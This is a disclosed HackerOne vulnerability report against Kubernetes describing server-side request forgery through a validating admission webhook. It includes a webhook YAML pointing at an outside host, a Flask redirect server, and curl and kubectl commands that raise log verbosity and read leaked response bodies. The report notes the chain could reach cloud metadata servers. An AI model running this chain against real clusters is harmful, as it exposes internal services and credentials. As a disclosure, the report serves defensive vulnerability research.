# SSRF for kube-apiserver cloudprovider scene

## Report Details
- **Report ID**: 941178
- **URL**: https://hackerone.com/reports/941178
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-24T12:41:44.871Z
- **Disclosed**: 2021-10-07T18:03:40.296Z

## Reporter
- **Username**: lazydog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
attacker can create admissionwebhook cause ssrf in cloudprovider server.
cloudprovider like GKE AKS EKS.

## Kubernetes Version:
kubernetes v1.18.6

## Component Version:
Docker version 19.03.6, build 369ce74a3c

## Steps To Reproduce:
1. use follwing command create v1.18.6 kubernetes, wait for the download  process done. 

`minikube start --vm-driver=none --kubernetes-version='v1.18.6'`

2.edit `kube-apiserver` options in following path.

```
/etc/kubernetes/manifests/kube-apiserver.yaml

add some options to  spec.containers.command field.  see pic1
--log-dir=/var/log
--logtostderr=false
```

{F920720}

3.save following yaml file to disk as poc1.yaml, and run command` kubectl create poc1.yaml`.

poc1.yaml 
```
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: test.config.xxx.io
webhooks:
- name: test.config.xxx.io
  rules:
  - apiGroups:   [""]
    apiVersions: ["v1", "v1beta1"]
    operations:  ["CREATE","DELETE","UPDATE"]
    resources:   ["serviceaccounts"]
    scope:       "*"
  clientConfig:
    # modify with your poc2 webserver
    url: "https://lazydog.me/aa"
    # if webserver using self-signed certificate must be add caBundle
    # caBundle: ""
  admissionReviewVersions: ["v1", "v1beta1"]
  sideEffects: None
  timeoutSeconds: 5
```

4.use `pip install Flask` to install flask deps, and run `FLASK_ENV=development FLASK_APP=poc1 flask run`. if you using self-signed certificate must be add `--cert PATH --key PATH` arguments to command.

poc2.py
```python
from flask import Flask, redirect, request, Response

app = Flask(__name__)

app.port = 80


@app.route('/<path:path>', methods=['POST','GET'])
def index(path=''):
    resp = ''
    print(request.headers)
    if path == 'test':
        res = Response("test")
        res.headers["Content-Type"] = "application/vnd.kubernetes.protobuf"
        return res

    return redirect('http://www.tencent.com/')
```

5.use `kubectl proxy &` start a apiserver proxy to localhost,and set` klog` level to 10. if not set klog level to 10 is can only recv http failed code response body.
```
curl -XPUT --data "10" http://localhost:8001/debug/flags/v
```

6.now we can create a serviceaccount let apiserver to request our evil webserver use this command `kubectl create sa testpoc`.

{F920762}

7.use `curl http://localhost:8001/logs/kube-apiserver.INFO` to find full response body, is may be include `Response Body:` strings.

{F920768}



## Supporting Material/References:

- klog set to 10 root cause. https://github.com/kubernetes/client-go/blob/31e286ee1926a84e0bfd4c8c8c77b3816f98244a/rest/request.go#L1072
- This link let our know gke is enabled logs handler https://groups.google.com/g/kubernetes-users/c/gHHhl0hI7GU

## Impact

I think this case is like ` CVE-2020–8555`,  attacker can cause a full response body ssrf in cloudprovider inner server.

if redirect url is metadata server maybe can leak some credentials or other sensitive information.

## Attachments
- pic1.png
- pic2.png
- pic3.png
